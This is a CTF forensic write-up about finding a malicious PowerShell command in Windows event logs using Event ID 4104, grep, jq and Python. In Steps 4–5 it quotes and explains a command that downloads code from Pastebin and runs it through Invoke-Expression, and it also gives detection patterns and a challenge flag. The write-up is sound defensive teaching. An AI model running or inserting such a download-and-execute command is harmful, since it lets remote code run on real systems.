# Dangerous_Events - Forensic Challenge Writeup

## Challenge Information
- **Category:** Forensic
- **Points:** 300
- **Difficulty:** Medium

## Challenge Description
"Our team has been provided with some Windows event logs. Looks like someone tried to execute something malicious. Can you find it?"

This challenge involves analyzing Windows Event Logs in JSON format to identify malicious PowerShell execution.

## Tools Required
- **Text Editor** or **IDE** - For viewing JSON logs
- **jq** - Command-line JSON processor (optional but helpful)
- **grep** - For searching through logs
- **Python** (optional) - For JSON parsing and analysis

## Background: Windows Event Logs

### Event ID 4104
- **Security Event:** PowerShell Script Block Logging
- **Purpose:** Records PowerShell script execution
- **Security Value:** Critical for detecting malicious PowerShell activity
- **Introduced:** Windows PowerShell 5.0

### Why Event ID 4104 Matters:
- Captures actual PowerShell commands executed
- Can't be easily disabled by attackers
- Records even obfuscated commands
- Essential for incident response

## Methodology

### Step 1: Understand the Log Format
The logs are provided in JSON format with structure:

```json
{
  "EventID": 4104,
  "Message": "Executing PowerShell command: ...",
  "TimeCreated": "...",
  "Computer": "...",
  ...
}
```

### Step 2: Search for PowerShell Execution Events
Look specifically for Event ID 4104 (PowerShell Script Block Logging):

```bash
# Using grep to find Event ID 4104
grep "EventID.*4104" windows_event_log.json

# Or use jq for better JSON parsing
jq '.[] | select(.EventID == 4104)' windows_event_log.json
```

### Step 3: Analyze Suspicious Commands
Common indicators of malicious PowerShell:
- **iwr/Invoke-WebRequest** - Downloading files
- **iex/Invoke-Expression** - Executing downloaded content
- **Pastebin URLs** - Common for hosting payloads
- **Base64 encoded commands** - Obfuscation technique
- **UseBasicParsing** - Bypassing IE initialization

### Step 4: Locate the Malicious Entry
Found at **line 11730** in the log file:

```json
{
  "EventID": 4104,
  "Message": "Executing PowerShell command: iwr -Uri https://pastebin.com/raw/w3B10p2h -UseBasicParsing | iex"
}
```

### Step 5: Analyze the Command Breakdown

```powershell
iwr -Uri https://pastebin.com/raw/w3B10p2h -UseBasicParsing | iex
```

**What it does:**
- `iwr` - Alias for `Invoke-WebRequest` (downloads content)
- `-Uri https://pastebin.com/raw/w3B10p2h` - Downloads from Pastebin
- `-UseBasicParsing` - Bypasses Internet Explorer dependencies
- `|` - Pipes the downloaded content
- `iex` - Alias for `Invoke-Expression` (executes the downloaded code)

**Why it's malicious:**
1. Downloads unknown code from external source
2. Immediately executes without inspection
3. Uses Pastebin (common C2 technique)
4. Classic "fileless" malware delivery

### Step 6: Alternative Search Methods

#### Method 1: Using grep with context
```bash
grep -B 2 -A 2 "pastebin" windows_event_log.json
grep -B 2 -A 2 "iwr.*iex" windows_event_log.json
```

#### Method 2: Using Python
```python
import json

with open('windows_event_log.json', 'r') as f:
    logs = json.load(f)

for event in logs:
    if event.get('EventID') == 4104:
        message = event.get('Message', '')
        if 'iex' in message.lower() or 'invoke-expression' in message.lower():
            print(f"Suspicious PowerShell found:")
            print(f"  Message: {message}")
            print(f"  Time: {event.get('TimeCreated')}")
            print()
```

#### Method 3: Using jq
```bash
# Find all Event ID 4104 with suspicious patterns
jq '.[] | select(.EventID == 4104 and (.Message | contains("iex") or contains("Invoke-Expression")))' windows_event_log.json
```

## Solution
The malicious PowerShell command is found in Event ID 4104, attempting to download and execute code from Pastebin.

**Flag:** `CSC25{C0mm4nd_&_COntr0I_4tt3MpT}`

## Understanding the Flag
"Command & Control Attempt" - This is exactly what the malicious PowerShell represents. The attacker is using a classic C2 (Command and Control) technique to download and execute remote commands.

## Real-World Context

### Command & Control (C2) Techniques:
1. **Pastebin/GitHub** - Host payloads on legitimate sites
2. **DNS Tunneling** - Hide commands in DNS queries
3. **HTTPS C2** - Blend with normal HTTPS traffic
4. **Social Media** - Use Twitter/Facebook as C2 channels
5. **Dead Drop Resolvers** - Retrieve C2 addresses from public sources

### Attack Phases:
1. **Initial Compromise** - Victim runs malicious command
2. **Beacon Drop** - Download C2 agent from Pastebin
3. **Execution** - Run the beacon to establish connection
4. **C2 Communication** - Attacker controls victim machine
5. **Lateral Movement** - Spread to other systems

## Detection Indicators (IOCs)

### PowerShell Indicators:
- Event ID 4104 (Script Block Logging)
- Event ID 4103 (Module Logging)
- Commands with `iwr | iex` pattern
- Base64 encoded commands
- `-EncodedCommand` parameter
- `-WindowStyle Hidden` parameter
- Downloads from Pastebin, GitHub, etc.

### Network Indicators:
- Connections to Pastebin from PowerShell process
- Outbound HTTPS to unusual domains
- Regular beaconing patterns
- DNS queries to suspicious domains

## Key Takeaways
1. **Enable PowerShell logging** - Event ID 4104 is critical for detection
2. **Monitor for suspicious patterns** - `iwr | iex` is a common attack vector
3. **Pastebin is often abused** - Consider blocking or monitoring
4. **Fileless attacks are prevalent** - No disk artifacts, only event logs
5. **Context matters** - Legitimate tools used maliciously

## Defense Strategies

### Prevention:
1. **Application Whitelisting** - Use AppLocker or Windows Defender Application Control
2. **Constrained Language Mode** - Restrict PowerShell capabilities
3. **Execution Policy** - Set to AllSigned or RemoteSigned
4. **Network Filtering** - Block access to paste sites if possible
5. **User Training** - Educate about phishing and social engineering

### Detection:
1. **Enable Script Block Logging**
   ```powershell
   # Registry setting
   HKLM\SOFTWARE\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
   EnableScriptBlockLogging = 1
   ```

2. **Monitor Event Logs**
   - Event ID 4104 - Script execution
   - Event ID 4103 - Module logging
   - Event ID 400 - Engine lifecycle

3. **Use SIEM** - Correlate events across systems

4. **Implement EDR** - Endpoint Detection and Response tools

### Response:
1. Isolate affected system
2. Collect memory dump and event logs
3. Analyze Pastebin payload (if still available)
4. Check for lateral movement
5. Reset credentials
6. Apply patches and harden systems

## Tools for Windows Event Log Analysis

### Command-Line:
- **wevtutil** - Built-in Windows Event Utility
- **Get-WinEvent** - PowerShell cmdlet
- **jq** - JSON processor
- **grep** - Pattern searching

### GUI Tools:
- **Event Viewer** - Windows built-in
- **Event Log Explorer** - Advanced log viewer
- **Splunk** - Enterprise SIEM
- **ELK Stack** - Open-source log analysis

### Python Libraries:
```python
import json
import pandas as pd

# For advanced analysis
df = pd.read_json('windows_event_log.json')
suspicious = df[df['EventID'] == 4104]
```

## Educational Value
This challenge teaches:
- How to analyze Windows Event Logs
- Identifying malicious PowerShell activity
- Understanding C2 techniques
- Importance of logging for forensics
- Real-world incident response procedures

## Additional Resources
- **MITRE ATT&CK:** T1059.001 (PowerShell)
- **MITRE ATT&CK:** T1105 (Ingress Tool Transfer)
- **SANS Windows Forensics Poster**
- **PowerShell Security Best Practices Guide**
